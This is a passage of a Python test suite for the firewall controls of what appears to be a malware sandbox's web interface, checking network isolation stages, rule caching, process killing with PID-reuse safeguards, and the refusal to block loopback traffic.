    assert calls[0]["event_ids"] == [22] and calls[0]["since"] == "2026-11-16T10:00:00Z"


def test_the_loop_prepares_once_then_ticks_and_sweeps_and_survives_all_three_failing(tdc, monkeypatch):
    order = []

    class Collector:
        def tick(self):
            order.append("tick")
            raise RuntimeError("boom")

        def interval(self):
            return 1.0

    monkeypatch.setattr(tdc, "_fw_prepare", lambda: order.append("prepare") or 1 / 0)
    monkeypatch.setattr(tdc, "_firewall_sweep", lambda now=None: order.append("sweep") or 1 / 0)
    slept = []
    tdc._firewall_loop(Collector(), rounds=2, sleep=slept.append)
    assert order == ["prepare"] + ["tick", "sweep"] * 2 and slept == [1.0, 1.0]


def test_the_first_step_of_the_collector_thread_does_what_start_up_needs(fw, tdc, tmp_path, monkeypatch):
    """It runs there, not at import: a PowerShell that hangs must not hold up the web UI."""
    monkeypatch.setattr(tdc, "CAPTURE_DIR", str(tmp_path / "samples"))
    monkeypatch.setattr(tdc, "_fw_startup", None)
    primed = []
    monkeypatch.setattr(tdc.firewall_fetch, "own_addresses", lambda refresh=False: primed.append(refresh))
    incoming = tmp_path / "samples" / tdc.firewall_fetch.STAGING
    incoming.mkdir(parents=True)
    (incoming / "half-a-payload").write_bytes(b"MZ")
    fw.run.rules["TDC-FW-ISO-fetch-0123456789ab"] = fw.run.view(
        "TDC-FW-ISO-fetch-0123456789ab", Action="Allow", Program=tdc._fw_fetcher_paths()[0])
    tdc._fw_prepare()
    assert tdc._fw_startup == {"isolated": False, "profiles_off": [], "announce": False, "note": None, "allowed_out": None,
                               "stage": "open"}
    assert os.listdir(incoming) == []                            # no partial file in a Defender-excluded root
    assert fw.run.rules == {}                                    # no way out of ISOLATED left standing
    assert primed == [True]                                      # no fetch pays for that lookup itself
    assert tdc._fw_isolate_state()["startup"]["announce"] is False


# ---- switching the firewall on, killing a process -----------------------------------------------


def test_enable_switches_every_profile_on_and_says_so(client, fw):
    fw.profiles = {"Domain": True, "Private": False, "Public": False}
    r = client.post("/api/firewall/enable", json={})
    assert r.status_code == 200 and r.json["enabled"] is True and r.json["profiles_off"] == []
    assert r.json["state"]["profiles_off"] == [] and fw.run.off() == []
    assert "Enable" in fw.run.ops()


def test_enable_that_leaves_a_profile_off_is_a_failure(client, fw, monkeypatch):
    fw.profiles = {"Domain": False, "Private": True, "Public": True}
    monkeypatch.setattr(fw.run, "op_Enable", lambda p: (0, "", ""))
    r = client.post("/api/firewall/enable", json={})
    assert r.status_code == 500 and r.json["enabled"] is False and r.json["profiles_off"] == ["Domain"]
    assert "Domain" in r.json["error"]


def test_enable_takes_no_fields(client, fw):
    assert client.post("/api/firewall/enable", json={"profiles": ["Public"]}).status_code == 400
    assert "Enable" not in fw.run.ops()


def started(monkeypatch, tdc, ago):
    """The process holding a pid started ``ago`` seconds before now (None: no such process)."""
    monkeypatch.setattr(tdc, "_process_started_at", lambda pid: None if ago is None else time.time() - ago)


def test_kill_ends_a_process_the_tab_shows(client, fw, tdc, monkeypatch):
    started(monkeypatch, tdc, 60)
    fw.store.add_connections([conn(pid=4812)])
    r = client.post("/api/firewall/kill", json={"pid": 4812})
    assert r.status_code == 200 and r.json == {"pid": 4812, "killed": True, "image": IMAGE}
    assert [c[1:] for c in fw.run.calls if c[0].lower().endswith("taskkill.exe")] == [["/PID", "4812", "/F"]]


@pytest.mark.parametrize("body, status", [({"pid": "4812"}, 400), ({"pid": True}, 400), ({}, 400),
                                          ({"pid": 4812, "force": True}, 400), ({"pid": 999}, 409)])
def test_kill_refuses_what_is_no_process_of_the_tab(client, fw, tdc, monkeypatch, body, status):
    started(monkeypatch, tdc, 60)
    fw.store.add_connections([conn(pid=4812)])
    assert client.post("/api/firewall/kill", json=body).status_code == status
    assert not any(c[0].lower().endswith("taskkill.exe") for c in fw.run.calls)


def test_kill_refuses_tdcs_own_processes(client, fw, tdc, monkeypatch):
    started(monkeypatch, tdc, 60)
    fw.store.add_connections([conn(pid=3300, image=r"C:\DetonationChamberUI\venv\Scripts\python.exe")])
    r = client.post("/api/firewall/kill", json={"pid": 3300})
    assert r.status_code == 409 and "TDC" in r.json["error"]
    assert not any(c[0].lower().endswith("taskkill.exe") for c in fw.run.calls)


def test_a_failing_taskkill_is_a_failure(client, fw, tdc, monkeypatch):
    started(monkeypatch, tdc, 60)
    fw.store.add_connections([conn(pid=4812)])
    fw.run.fail["taskkill"] = (128, "", "ERROR: The process \"4812\" not found.")
    r = client.post("/api/firewall/kill", json={"pid": 4812})
    assert r.status_code == 500 and "4812" in r.json["error"]



def _taskkills(fw):
    return [c for c in fw.run.calls if c[0].lower().endswith("taskkill.exe")]


def test_kill_refuses_a_pid_windows_has_given_to_another_process(client, fw, tdc, monkeypatch):
    # the loader connected 5 s ago and ended; a process that started 1 s ago holds its PID now
    fw.store.add_connections([conn(pid=4812, t=-5.0)])
    started(monkeypatch, tdc, 1)
    r = client.post("/api/firewall/kill", json={"pid": 4812})
    assert r.status_code == 409 and "another process" in r.json["error"] and _taskkills(fw) == []


def test_kill_does_not_judge_a_reused_pid_by_the_old_processs_image(client, fw, tdc, monkeypatch):
    # PID 3300 was TDC's own python, long ago; the sample holds it now and connected after it started
    own = r"C:\DetonationChamberUI\venv\Scripts\python.exe"
    fw.store.add_connections([conn(pid=3300, image=own, t=-600.0), conn(pid=3300, image=IMAGE, t=-5.0)])
    started(monkeypatch, tdc, 60)
    r = client.post("/api/firewall/kill", json={"pid": 3300})
    assert r.status_code == 200 and r.json["image"] == IMAGE and len(_taskkills(fw)) == 1


def test_kill_refuses_a_pid_that_is_not_running(client, fw, tdc, monkeypatch):
    fw.store.add_connections([conn(pid=4812)])
    started(monkeypatch, tdc, None)
    r = client.post("/api/firewall/kill", json={"pid": 4812})
    assert r.status_code == 409 and "not running" in r.json["error"] and _taskkills(fw) == []


def test_kill_allows_for_a_little_clock_disagreement(client, fw, tdc, monkeypatch):
    # Sysmon stamps the connection a moment before Windows' start time of the same process. The clock is pinned, so
    # the disagreement is exactly the one this test sets and not the time the request happens to take.
    now = 1_800_000_000.0
    monkeypatch.setattr(tdc.time, "time", lambda: now)
    slack = tdc.FIREWALL_KILL_CLOCK_SLACK_S
    fw.store.add_connections([conn(pid=4812, t=-5.0)])
    monkeypatch.setattr(tdc, "_process_started_at", lambda pid: now - 5.0 + slack / 2)    # within the slack
    assert client.post("/api/firewall/kill", json={"pid": 4812}).status_code == 200
    monkeypatch.setattr(tdc, "_process_started_at", lambda pid: now - 5.0 + slack * 2)    # beyond it: another process
    r = client.post("/api/firewall/kill", json={"pid": 4812})
    assert r.status_code == 409 and "another process" in r.json["error"] and len(_taskkills(fw)) == 1


# ---- GET /isolate is cheap enough to poll -----------------------------------------------------


def _profile_reads(fw):
    return fw.run.ops().count("Profiles")


def test_the_isolate_state_reads_the_profiles_once_a_minute(client, fw, tdc, monkeypatch):
    clock = [1000.0]
    monkeypatch.setattr(tdc.time, "monotonic", lambda: clock[0])
    for _ in range(12):
        assert client.get("/api/firewall/isolate").json["profiles_off"] == []
    assert _profile_reads(fw) == 1
    clock[0] += tdc.FIREWALL_PROFILES_TTL_S + 1
    client.get("/api/firewall/isolate")
    assert _profile_reads(fw) == 2


def test_the_open_way_out_is_as_fresh_as_the_request(client, fw, tdc, monkeypatch):
    client.get("/api/firewall/isolate")
    reads = _profile_reads(fw)
    monkeypatch.setitem(tdc._fw_fetch_open, ("TDC-FW-ISO-fetch-0123456789ab",),
                        {"rule_id": "TDC-FW-ISO-fetch-0123456789ab", "problem": "Access is denied.", "since": 1.0})
    monkeypatch.setitem(tdc._fw_fetch_paths, ("TDC-FW-ISO-fetch-0123456789ab",), {"holders": 1, "busy": False, "problem": None})
    state = client.get("/api/firewall/isolate").json
    assert [h["rule_id"] for h in state["fetch_paths_open"]] == ["TDC-FW-ISO-fetch-0123456789ab"]
    assert state["fetches_in_flight"] == 1 and state["residual"]
    assert _profile_reads(fw) == reads, "the in-memory fields cost a PowerShell call"


def test_turning_the_firewall_on_shows_at_once(client, fw):
    fw.profiles = {"Domain": True, "Private": False, "Public": True}
    assert client.get("/api/firewall/isolate").json["profiles_off"] == ["Private"]
    r = client.post("/api/firewall/enable", json={})
    assert r.json["state"]["profiles_off"] == []
    assert client.get("/api/firewall/isolate").json["profiles_off"] == []


def test_an_enforcement_route_reads_the_profiles_fresh_and_forgets_the_cache(client, fw):
    assert client.get("/api/firewall/isolate").json["profiles_off"] == []
    fw.profiles = {"Domain": True, "Private": False, "Public": True}
    r = client.post("/api/firewall/block", json={"scope": "process", "image": IMAGE})
    assert r.status_code == 409 and fw.run.rules == {}, "a block went by the cached 'all on'"
    assert client.get("/api/firewall/isolate").json["profiles_off"] == ["Private"]


def test_a_profile_read_that_fails_is_cached_for_less_time(client, fw, tdc, monkeypatch):
    clock = [1000.0]
    monkeypatch.setattr(tdc.time, "monotonic", lambda: clock[0])
    fw.run.fail["Profiles"] = (1, "Access is denied.")
    state = client.get("/api/firewall/isolate").json
    assert state["profiles_off"] is None and "denied" in state["profiles_error"].lower()
    del fw.run.fail["Profiles"]
    clock[0] += tdc.FIREWALL_PROFILES_ERROR_TTL_S + 1
    assert client.get("/api/firewall/isolate").json["profiles_off"] == [] and _profile_reads(fw) == 2


# ---- what ISOLATED does not close, and the start-up toast --------------------------------------


def test_after_converging_the_state_says_what_windows_own_rules_still_let_out_and_caches_it(client, fw, tdc, monkeypatch):
    from test_firewall_rules import GPO_RULE, STOCK
    fw.run.foreign = {n: dict(r) for n, r in {**STOCK, **GPO_RULE}.items()}
    assert client.get("/api/firewall/isolate").json["allowed_out"] is None          # off: nothing to read
    assert "AllowOut" not in fw.run.ops()
    on = client.post("/api/firewall/isolate", json={"on": True}).json
    assert on["stage"] == "cut" and on["state"]["allow_disabled"] == 0         # the press records nothing about them
    fw.converge()                                                                     # the thorough part, in the worker
    assert len(fw.settings.allow_disabled) == 2 and fw.settings.stage == "cut_policy"
    clock = [1000.0]
    monkeypatch.setattr(tdc.time, "monotonic", lambda: clock[0])
    state = client.get("/api/firewall/isolate").json
    assert state["stage"] == "cut_policy" and [r["name"] for r in state["allowed_out"]] == ["{gpo-1}"]
    reads = fw.run.ops().count("AllowOut")
    for _ in range(5):
        assert [r["name"] for r in client.get("/api/firewall/isolate").json["allowed_out"]] == ["{gpo-1}"]
    assert fw.run.ops().count("AllowOut") == reads                                    # cached, like the profiles
    off = client.post("/api/firewall/isolate", json={"on": False}).json
    assert off["state"]["allowed_out"] is None and fw.run.enabled_foreign() == sorted(["CoreNet-DHCP-Out", "CoreNet-DNS-Out-UDP", "{gpo-1}"])


def test_the_residual_no_longer_promises_that_nothing_but_loopback_gets_out(client, fw):
    text = client.get("/api/firewall/isolate").json["residual"]
    assert "Windows' own outbound Allow rules" in text and "group policy" in text and "but loopback" not in text


def test_pending_carries_the_start_up_state_for_a_toast_on_every_tab(client, fw, tdc, monkeypatch):
    monkeypatch.setattr(tdc, "_fw_startup", None)
    assert client.get("/api/firewall/pending").json["startup"] is None
    monkeypatch.setattr(tdc, "_fw_startup", {"isolated": True, "announce": True, "note": "ISOLATED is on", "profiles_off": []})
    fw.settings.set(isolated=True, outbound_before="Allow")
    r = client.get("/api/firewall/pending").json
    assert r["isolated"] is True and r["startup"] == {"id": tdc._FW_START_ID, "announce": True, "note": "ISOLATED is on"}


def test_the_rules_are_read_once_a_minute_and_again_after_every_enforcement(client, fw, tdc, monkeypatch):
    clock = [1000.0]
    monkeypatch.setattr(tdc.time, "time", lambda: clock[0])
    for _ in range(10):
        client.get("/api/firewall/connections")
        clock[0] += 5
    assert fw.run.ops().count("List") == 1
    client.post("/api/firewall/block", json={"scope": "process", "image": r"C:\x\loader.exe"})
    before = fw.run.ops().count("List")
    client.get("/api/firewall/connections")
    assert fw.run.ops().count("List") == before + 1                                   # forgotten by the block


# ---- enforcement never takes the 60 s rule cache -----------------------------------------------


def test_a_block_removed_outside_tdc_is_written_again_not_confirmed_from_the_cache(client, fw, tdc):
    first = tdc._fw_ensure_block(FINDING)
    assert first["verified"] is True
    tdc._fw_rules()                                   # the cache now holds the rule
    fw.run.rules.pop(first["rule_id"])                # the hatch, wf.msc or the sample removes it
    creates = fw.run.ops().count("Create")
    again = tdc._fw_ensure_block(FINDING)
    assert fw.run.ops().count("Create") > creates and first["rule_id"] in fw.run.rules
    assert again["verified"] is True and again["rule_id"] == first["rule_id"]


def test_an_address_wide_block_removed_outside_tdc_no_longer_refuses_block_fetch(client, fw, tdc):
    client.post("/api/firewall/block", json={"scope": "endpoint_all", "ip": "203.0.113.50"})
    tdc._fw_rules()                                   # cached with the block for every program
    for name in [n for n, r in fw.run.rules.items() if r["Program"] == "Any"]:
        fw.run.rules.pop(name)                        # removed outside TDC
    assert tdc._fw_address_wide_block(FINDING) is True                  # the poll path may lag a minute...
    assert tdc._fw_address_wide_block(FINDING, force=True) is False     # ...enforcement reads it fresh
    pid = fw.pending.add(FINDING, deadline=time.time() + 30)["id"]
    assert client.post("/api/firewall/decide", json={"id": pid, "action": "block_fetch"}).status_code == 200


def test_the_isolated_button_costs_two_powershell_calls_to_cut_six_to_converge_and_three_off(client, fw, tdc):
    from test_firewall_rules import STOCK
    fw.run.foreign = {n: dict(r) for n, r in STOCK.items()}
    fw.run.calls.clear()
    on = client.post("/api/firewall/isolate", json={"on": True})
    assert on.status_code == 200 and on.json["verified"] is True and on.json["stage"] == "cut"
    assert on.json["state"]["profiles_off"] == []
    assert fw.run.ops() == ["Profiles", "Cut"]
    fw.run.calls.clear()
    fw.converge()                                                                     # the worker the press started
    assert fw.run.ops() == ["AllowOut", "DisableAllowOut", "SetDefaultOutbound", "AllowOut", "Remove", "Get"]
    assert fw.settings.stage == "isolated" and client.get("/api/firewall/isolate").json["verified"] is True
    fw.run.calls.clear()
    off = client.post("/api/firewall/isolate", json={"on": False})
    assert off.status_code == 200 and off.json["state"]["profiles_off"] == []
    assert fw.run.ops() == ["SetDefaultOutbound", "EnableAllowOut", "RemoveIsolate"]


def test_isolated_refused_for_a_profile_that_is_off_is_409_and_changes_nothing(client, fw):
    fw.profiles = {"Domain": True, "Private": True, "Public": False}
    r = client.post("/api/firewall/isolate", json={"on": True})
    assert r.status_code == 409 and "Public" in r.json["error"]
    assert fw.run.writes() == [] and fw.settings.isolated is False


# ---- the press answers after the cut; the thorough part runs in one background worker ------------


def _workers_started(fw):
    return len(fw.started)


def _wait_until(condition, rounds=500):
    """Poll ``condition`` from the test thread, a short wait at a time, without reading the clock."""
    pause = threading.Event()
    for _ in range(rounds):
        if condition():
            return True
        pause.wait(0.01)
    return condition()


def _hang_in(fw, op):
    """Make ``op`` of the fake firewall hang until the returned ``gate`` is set; ``inside`` is set when it is reached."""
    inside, gate, real = threading.Event(), threading.Event(), getattr(fw.run, "op_" + op)

    def hanging(params):
        inside.set()
        gate.wait(10)
        return real(params)
    setattr(fw.run, "op_" + op, hanging)
    return inside, gate


def _start_fetch(client, fw, tdc):
    """ISOLATED in its thorough stage with one fetch under way, its per-fetch Allow rule standing."""
    client.post("/api/firewall/isolate", json={"on": True})
    fw.converge()
    assert fw.settings.stage == "isolated"
    names, problem = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    assert names and problem is None
    return names


def test_switching_isolated_on_answers_in_the_cut_stage(client, fw):
    r = client.post("/api/firewall/isolate", json={"on": True})
    assert r.status_code == 200
    assert r.json["stage"] == "cut" and r.json["converging"] is True and r.json["verified"] is True
    assert r.json["rule_id"] == "TDC-FW-ISO-cut" and r.json["state"]["converging"] is True


def test_the_answer_does_not_wait_for_the_slow_part(client, fw):
    from test_firewall_rules import STOCK
    fw.run.foreign = {n: dict(r) for n, r in STOCK.items()}
    client.post("/api/firewall/isolate", json={"on": True})
    # the profile read the way back needs, the cut, and nothing of the thorough part: it waits in the worker
    assert fw.run.ops() == ["Profiles", "Cut"] and _workers_started(fw) == 1 and fw.waiting


def test_the_state_names_the_stage_and_whether_a_sample_can_still_be_secured(client, fw):
    off = client.get("/api/firewall/isolate").json
    assert off["stage"] == "open" and off["converging"] is False and off["can_fetch"] is None   # list not read yet
    client.get("/api/firewall/connections")                                   # the poll reads the rule list
    assert client.get("/api/firewall/isolate").json["can_fetch"] is True
    client.post("/api/firewall/isolate", json={"on": True})
    state = client.get("/api/firewall/isolate").json
    assert state["stage"] == "cut" and state["can_fetch"] is False and state["converging"] is True
    assert state["verified"] is True and state["converge_note"] is None


def test_two_presses_in_a_row_make_one_rule_and_one_worker(client, fw):
    client.post("/api/firewall/isolate", json={"on": True})
    before = fw.settings.outbound_before
    client.post("/api/firewall/isolate", json={"on": True})
    assert fw.run.ops().count("Cut") == 2                     # idempotent on Windows' side
    assert [n for n in fw.run.rules if n.startswith("TDC-FW-ISO-")] == ["TDC-FW-ISO-cut"]
    assert _workers_started(fw) == 1 and fw.settings.outbound_before == before
    fw.converge()
    assert fw.settings.stage == "isolated"
    client.get("/api/firewall/connections")
    state = client.get("/api/firewall/isolate").json
    assert state["converging"] is False and state["verified"] is True and state["can_fetch"] is True


def test_a_press_while_the_worker_idles_starts_it_again(client, fw):
    client.post("/api/firewall/isolate", json={"on": True})
    fw.converge()
    client.post("/api/firewall/isolate", json={"on": True})   # the "ISOLATED · OPEN" remedy: cut again
    assert _workers_started(fw) == 2 and fw.settings.stage == "cut"
    fw.converge()
    assert fw.settings.stage == "isolated" and "TDC-FW-ISO-cut" not in fw.run.rules


def test_leaving_cancels_the_worker_and_does_not_wait_for_a_hanging_call(client, fw, tdc, monkeypatch):
    from test_firewall_rules import STOCK
    fw.run.foreign = {n: dict(r) for n, r in STOCK.items()}
    monkeypatch.setattr(tdc, "_fw_converge_spawn", tdc._fw_converge_thread)       # a real thread this time
    inside, gate = _hang_in(fw, "DisableAllowOut")
    assert client.post("/api/firewall/isolate", json={"on": True}).status_code == 200
    assert inside.wait(10)                                    # the worker is in the hanging call, holding the lock
    answers = []
    leaver = threading.Thread(target=lambda: answers.append(
        tdc.app.test_client().post("/api/firewall/isolate", json={"on": False})))
    leaver.start()
    # the flag is up while the leave still waits for the lock: it was set before the leave called in
    assert _wait_until(lambda: tdc._fw_converge_event.is_set())
    assert answers == []
    before = len(fw.run.ops())
    gate.set()                                                # the hanging call returns
    leaver.join(10)
    assert not leaver.is_alive()
    r = answers[0]
    assert r.status_code == 200 and r.json["isolated"] is False and r.json["cut_removed"] is True
    assert _wait_until(lambda: not tdc._fw_converge_running)
    # after the call it was in, the worker took no further step: what follows is the leave's own way back
    assert fw.run.ops()[before:] == ["SetDefaultOutbound", "EnableAllowOut", "RemoveIsolate"]
    assert fw.run.enabled_foreign() == ["CoreNet-DHCP-Out", "CoreNet-DNS-Out-UDP"] and fw.run.rules == {}
    state = client.get("/api/firewall/isolate").json
    assert state["converging"] is False and "cancelled" in state["converge_note"].lower()
    assert state["stage"] == "open" and fw.settings.allow_disabled == []


def test_a_second_press_during_the_convergence_waits_for_one_call_and_the_worker_finishes_the_job(client, fw, tdc,
                                                                                                    monkeypatch):
    from test_firewall_rules import STOCK
    fw.run.foreign = {n: dict(r) for n, r in STOCK.items()}
    monkeypatch.setattr(tdc, "_fw_converge_spawn", tdc._fw_converge_thread)
    inside, gate = _hang_in(fw, "DisableAllowOut")
    client.post("/api/firewall/isolate", json={"on": True})
    assert inside.wait(10)
    answers = []
    presser = threading.Thread(target=lambda: answers.append(
        tdc.app.test_client().post("/api/firewall/isolate", json={"on": True})))
    presser.start()
    assert _wait_until(lambda: tdc._fw_converge_event.is_set())
    gate.set()
    presser.join(10)
    assert answers[0].status_code == 200 and answers[0].json["stage"] == "cut"
    assert _wait_until(lambda: not tdc._fw_converge_running)
    assert fw.settings.stage == "isolated" and "TDC-FW-ISO-cut" not in fw.run.rules
    assert tdc._fw_converge_note is None


def test_a_refused_second_press_keeps_the_isolation_converging_and_its_cut_verified(client, fw):
    client.post("/api/firewall/isolate", json={"on": True})
    fw.profiles = {"Domain": True, "Private": False, "Public": True}
    r = client.post("/api/firewall/isolate", json={"on": True})                # it stopped the round, then refused
    assert r.status_code == 409 and fw.settings.isolated is True
    state = client.get("/api/firewall/isolate").json
    assert state["converging"] is True and state["verified"] is True and _workers_started(fw) == 1


def test_a_worker_that_runs_after_a_leave_changes_nothing(client, fw):
    from test_firewall_rules import STOCK
    fw.run.foreign = {n: dict(r) for n, r in STOCK.items()}
    client.post("/api/firewall/isolate", json={"on": True})
    client.post("/api/firewall/isolate", json={"on": False})
    writes = fw.run.writes()
    fw.converge()                                             # the thread got its turn only now
    assert fw.run.writes() == writes and fw.settings.allow_disabled == []
    assert fw.run.enabled_foreign() == ["CoreNet-DHCP-Out", "CoreNet-DNS-Out-UDP"]


def test_a_profile_that_is_off_refuses_the_cut_with_409(client, fw):
    fw.profiles = {"Domain": True, "Private": False, "Public": True}
    r = client.post("/api/firewall/isolate", json={"on": True})
    assert r.status_code == 409 and "firewall" in r.json["error"].lower()
    assert _workers_started(fw) == 0 and fw.run.writes() == []


def test_a_fetch_in_flight_is_not_claimed_to_be_possible_once_the_cut_stands(client, fw, tdc):
    names = _start_fetch(client, fw, tdc)
    client.get("/api/firewall/connections")
    assert client.get("/api/firewall/isolate").json["can_fetch"] is True
    client.post("/api/firewall/isolate", json={"on": True})
    state = client.get("/api/firewall/isolate").json
    assert state["can_fetch"] is False and state["fetches_in_flight"] == 1
    fw.pending.add(FINDING, deadline=time.time() + 30)
    assert client.get("/api/firewall/pending").json["pending"][0]["can_fetch"] is False
    tdc._fw_close_fetch_path(names)


def test_cut_policy_never_claims_a_fetch_and_keeps_the_presss_verified(client, fw):
    from test_firewall_rules import GPO_RULE, STOCK
    fw.run.foreign = {n: dict(r) for n, r in {**STOCK, **GPO_RULE}.items()}
    client.post("/api/firewall/isolate", json={"on": True})
    fw.converge()
    state = client.get("/api/firewall/isolate").json
    assert state["stage"] == "cut_policy" and state["can_fetch"] is False and state["verified"] is True
    assert "Lab proxy out" in state["converge_note"]


def test_a_convergence_that_fails_does_not_unverify_the_cut_the_press_read_back(client, fw):
    client.post("/api/firewall/isolate", json={"on": True})
    fw.run.fail["AllowOut"] = (1, "Access is denied.")
    fw.converge()                                             # converge says verified False: it read back nothing
    state = client.get("/api/firewall/isolate").json
    assert state["stage"] == "cut" and state["verified"] is True and state["can_fetch"] is False
    assert state["converging"] is False and "could not be read" in state["converge_note"]


def test_a_worker_that_raises_says_so_and_does_not_claim_the_cut(client, fw, tdc, monkeypatch):
    client.post("/api/firewall/isolate", json={"on": True})

    def broken(*args, **kwargs):
        raise RuntimeError("the worker tripped")
    monkeypatch.setattr(tdc.firewall_rules, "converge", broken)
    fw.converge()
    state = client.get("/api/firewall/isolate").json
    assert state["converging"] is False and "the worker tripped" in state["converge_note"]
    assert state["verified"] is False and state["can_fetch"] is False


def test_a_marker_in_stage_open_is_not_read_as_free(client, fw):
    # start-up can save stage open with the marker standing (a profile was off), while the cut rule holds
    fw.settings.set(isolated=True, outbound_before="Allow", stage="open")
    fw.run.rules["TDC-FW-ISO-cut"] = fw.run.view("TDC-FW-ISO-cut")
    state = client.get("/api/firewall/isolate").json
    assert state["isolated"] is True and state["can_fetch"] is False and state["verified"] is False
    r = client.post("/api/firewall/isolate", json={"on": True})                # the press still works from here
    assert r.status_code == 200 and r.json["stage"] == "cut" and _workers_started(fw) == 1


def test_a_cut_rule_without_a_marker_is_not_a_way_out_for_a_fetch(client, fw):
    fw.run.rules["TDC-FW-ISO-cut"] = fw.run.view("TDC-FW-ISO-cut")            # a crash left it standing
    # right after start-up nothing has read the rule list: not known, so never True
    assert client.get("/api/firewall/isolate").json["can_fetch"] is None
    client.get("/api/firewall/connections")                                   # the poll reads the rule list
    state = client.get("/api/firewall/isolate").json
    assert state["isolated"] is False and state["can_fetch"] is False
    fw.pending.add(FINDING, deadline=time.time() + 30)
    assert client.get("/api/firewall/pending").json["pending"][0]["can_fetch"] is False


def test_an_allow_rule_that_comes_back_later_makes_the_state_say_not_closed(client, fw):
    from test_firewall_rules import STOCK
    fw.run.foreign = {n: dict(r) for n, r in STOCK.items()}
    client.post("/api/firewall/isolate", json={"on": True})
    fw.converge()                                             # stage isolated, allowed_out empty
    assert client.get("/api/firewall/isolate").json["verified"] is True
    fw.run.foreign["CoreNet-Teredo-Out"]["Enabled"] = True    # a policy refresh switches one on again
    fw.run.calls.clear()
    with fw.tdc._fw_profiles_lock:
        fw.tdc._fw_allowed_cache = None                       # the minute of the cache has passed
    state = client.get("/api/firewall/isolate").json
    assert state["verified"] is False and [r["name"] for r in state["allowed_out"]] == ["CoreNet-Teredo-Out"]
    assert state["stage"] == "isolated" and "Cut" not in fw.run.ops() and fw.run.writes() == []
    assert _workers_started(fw) == 1                          # TDC does NOT cut again by itself


def test_a_default_action_set_back_to_allow_under_stage_isolated_makes_the_state_say_not_closed(client, fw, tdc):
    from test_firewall_rules import STOCK
    fw.run.foreign = {n: dict(r) for n, r in STOCK.items()}
    client.post("/api/firewall/isolate", json={"on": True})
    fw.converge()                                             # stage isolated: Block holds the egress, the rule is gone
    assert "TDC-FW-ISO-cut" not in fw.run.rules and client.get("/api/firewall/isolate").json["verified"] is True
    fw.run.forced["Private"] = "Allow"                        # a group policy refresh puts Allow in force again
    with tdc._fw_profiles_lock:
        tdc._fw_profiles_cache = None                         # the minute of the cache has passed
    state = client.get("/api/firewall/isolate").json
    assert state["stage"] == "isolated" and state["allowed_out"] == [] and state["verified"] is False
    assert "Cut" not in fw.run.ops()[-3:] and _workers_started(fw) == 1   # reported, not repaired


def test_stage_isolated_with_a_profile_off_or_the_profiles_unreadable_is_not_verified(client, fw, tdc):
    client.post("/api/firewall/isolate", json={"on": True})
    fw.converge()
    fw.profiles = {"Domain": True, "Private": False, "Public": True}          # Block configured, but not enforced
    with tdc._fw_profiles_lock:
        tdc._fw_profiles_cache = None
    assert client.get("/api/firewall/isolate").json["verified"] is False
    fw.run.fail["Profiles"] = (1, "Access is denied.")
    with tdc._fw_profiles_lock:
        tdc._fw_profiles_cache = None
    state = client.get("/api/firewall/isolate").json
    assert state["stage"] == "isolated" and state["verified"] is False and state["profiles_off"] is None


def test_the_profile_read_for_verified_is_the_same_cached_read_as_profiles_off(client, fw, tdc):
    client.post("/api/firewall/isolate", json={"on": True})
    fw.converge()
    client.get("/api/firewall/isolate")
    reads = fw.run.ops().count("Profiles")
    for _ in range(5):
        assert client.get("/api/firewall/isolate").json["verified"] is True
    assert fw.run.ops().count("Profiles") == reads


# ---- loopback: Windows does not filter it, so nothing is written and nothing is claimed -----------


def test_a_download_from_loopback_opens_a_decision_that_claims_no_block(client, fw, tdc, monkeypatch):
    seed(fw, url="http://127.0.0.1:9000/stage2.dll", dst="127.0.0.1", port=9000)
    open_window(monkeypatch, tdc)
    sweep(tdc)
    (item,) = fw.pending.open()
    block = item["result"]["block"]
    assert "verified" not in block and "does not filter loopback" in block["error"]
    assert fw.run.rules == {} and "Create" not in fw.run.ops()
    view = client.get("/api/firewall/pending").json["pending"][0]
    assert view["result"]["block"]["error"] == block["error"]


def test_the_block_route_refuses_loopback_with_the_reason(client, fw):
    for body in ({"scope": "endpoint", "image": IMAGE, "ip": "127.0.0.1"},
                 {"scope": "endpoint", "image": IMAGE, "ip": "::ffff:127.0.0.1", "port": 9000, "protocol": "tcp"},
                 {"scope": "endpoint_all", "ip": "::1"}):
        r = client.post("/api/firewall/block", json=body)
        assert r.status_code == 409 and "does not filter loopback" in r.json["error"], body
    assert fw.run.rules == {} and "Create" not in fw.run.ops()
